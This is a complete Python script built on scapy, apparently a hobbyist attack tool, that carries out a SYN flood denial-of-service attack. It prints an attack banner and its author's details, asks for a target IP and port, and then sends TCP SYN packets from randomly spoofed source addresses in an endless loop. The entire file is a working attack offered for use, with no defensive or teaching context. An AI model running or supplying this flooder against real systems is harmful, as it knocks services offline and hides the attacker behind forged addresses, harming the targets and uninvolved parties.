#!usr/bin/python3
from scapy.all import IP,TCP,send
from ipaddress import IPv4Address
from random import getrandbits
import pyfiglet
#colors
class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR
    B = "\033[0;34;40m" # Blue
    orange='\033[43m' 
    purple='\033[45m'
    cyan='\033[46m'
    lightgrey='\033[47m'
    lightgrey='\033[37m'
    darkgrey='\033[90m'
    lightred='\033[91m'
    pink='\033[95m'

ascii_banner = pyfiglet.figlet_format("Syn Flood Attack!!")
print(ascii_banner)
print(f"{bcolors.pink}Author: Viraj Vaishnav{bcolors.RESET}")
print(f"{bcolors.pink}Follow on: https://twitter.com/VirajVaishnav16{bcolors.RESET}")
a = input(f"{bcolors.lightred}Target IP: {bcolors.RESET}{bcolors.lightred}")
print(f"{bcolors.RESET}")
d = input(f"{bcolors.lightred}Target PORT: {bcolors.RESET}{bcolors.lightred}")
print(f"{bcolors.RESET}")
b = IP(dst=a)
c = TCP(sport=9090,dport=d,seq=1551,flags='S')
pkt = b/c

while True:
      pkt[IP].src = str(IPv4Address(getrandbits(32)))
      send(pkt,verbose=0)
